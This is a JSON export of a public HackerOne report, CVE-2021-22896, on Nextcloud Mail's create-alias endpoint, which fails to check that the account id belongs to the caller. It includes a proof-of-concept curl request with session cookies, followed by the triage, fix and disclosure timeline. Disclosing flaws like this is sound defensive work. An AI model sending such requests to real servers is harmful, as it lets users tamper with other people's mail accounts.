{"id":1129996,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTI5OTk2","url":"https://hackerone.com/reports/1129996","title":"Create alias does not validate account id","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2021-03-18T11:41:55.196Z","submitted_at":"2021-03-18T11:41:55.265Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kesselb","url":"/kesselb","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-22896"],"singular_disclosure_disabled":false,"disclosed_at":"2021-06-01T08:40:50.188Z","bug_reporter_agreed_on_going_public_at":"2021-06-01T08:40:50.134Z","team_member_agreed_on_going_public_at":"2021-05-31T15:53:52.603Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The request to create a new alias does not validate that account id belongs to the current user.  Also we don't validate that the account id exists. \n\n```\ncurl 'http://localhost:50001/index.php/apps/mail/api/accounts/2000/aliases' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Pragma: no-cache' \\\n  -H 'Cache-Control: no-cache' \\\n  -H 'Accept: application/json, text/plain, */*' \\\n  -H 'requesttoken: 75bTbDfs3loR2Vr8pYPtefIjwiAQzQUtg2f9oeASmxI=:uv+XIBzaqg51imjI9/WcFZobsFpUiF1GsgiYio961Uc=' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36' \\\n  -H 'Content-Type: application/json;charset=UTF-8' \\\n  -H 'Origin: http://localhost:50001' \\\n  -H 'Sec-Fetch-Site: same-origin' \\\n  -H 'Sec-Fetch-Mode: cors' \\\n  -H 'Sec-Fetch-Dest: empty' \\\n  -H 'Accept-Language: en-US,en;q=0.9' \\\n  -H 'Cookie: oc_sessionPassphrase=A%2BwmqbZZ4JJAydZ1Wg68GDAAhSdoipmHWCWTwfEJTIHmYyh6D59aMjilXtuhYbF8NMvfrUsvDuZ43d8nm91kpx0oe%2BnKm31YjI9%2FU0WsJK4Zqy5ygsi92Nhu4EPIn8%2Bg; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc5hwbau68t9=95154162557362dd231a75e7b065b1ea; nc_username=bob; nc_token=oe2FicKizx%2BUvvdToxpu%2Biob2h3vMJOD; nc_session_id=95154162557362dd231a75e7b065b1ea' \\\n  --data-raw '{\"aliasName\":\"hello hello hello\",\"alias\":\"hellohello@test.local\"}' \\\n  --compressed\n```\n\nRequest above will create a alias with account id = 2000 even if there is no such account.\n\n## Impact\n\nAn attacker could create an alias (for an existing mail account) for another users.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-06-30T15:53:52.707Z","allow_singular_disclosure_after":-8890366.836320158,"singular_disclosure_allowed":true,"vote_count":3,"voters":["yusuf_furkan","iamcoolcat","ekgaribadmi"],"severity":{"rating":"medium","score":5.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":45132,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/mail","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":11040951,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","automated_response":true,"created_at":"2021-03-18T11:41:55.671Z","updated_at":"2021-03-18T11:41:55.671Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11076791,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2021-03-22T12:23:47.341Z","updated_at":"2021-03-22T12:23:47.341Z","actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11197201,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Fixed as per https://github.com/nextcloud/mail/pull/4864","automated_response":false,"created_at":"2021-03-31T11:03:36.260Z","updated_at":"2021-03-31T11:03:36.260Z","actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kesselb","url":"/kesselb"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11197206,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Ineligible for a bounty as this is an internal finding.","automated_response":false,"created_at":"2021-03-31T11:03:57.102Z","updated_at":"2021-03-31T11:03:57.102Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11514622,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-04-26T13:59:10.319Z","updated_at":"2021-04-26T13:59:10.319Z","cve_ids":["CVE-2021-22896"],"actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11514636,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kesselb, can you let me know how/if you want to be credited on the advisories? :)","automated_response":false,"created_at":"2021-04-26T14:00:38.159Z","updated_at":"2021-04-26T14:00:38.159Z","actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11517664,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, please credit me as kesselb ;)","automated_response":false,"created_at":"2021-04-26T16:08:21.992Z","updated_at":"2021-04-26T16:08:21.992Z","actor":{"username":"kesselb","cleared":false,"url":"/kesselb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11939394,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-05-31T15:53:52.629Z","updated_at":"2021-05-31T15:53:52.629Z","first_to_agree":true,"actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11943958,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-01T08:40:50.155Z","updated_at":"2021-06-01T08:40:50.155Z","actor":{"username":"kesselb","cleared":false,"url":"/kesselb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11943959,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-01T08:40:50.225Z","updated_at":"2021-06-01T08:40:50.225Z","actor":{"username":"kesselb","cleared":false,"url":"/kesselb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}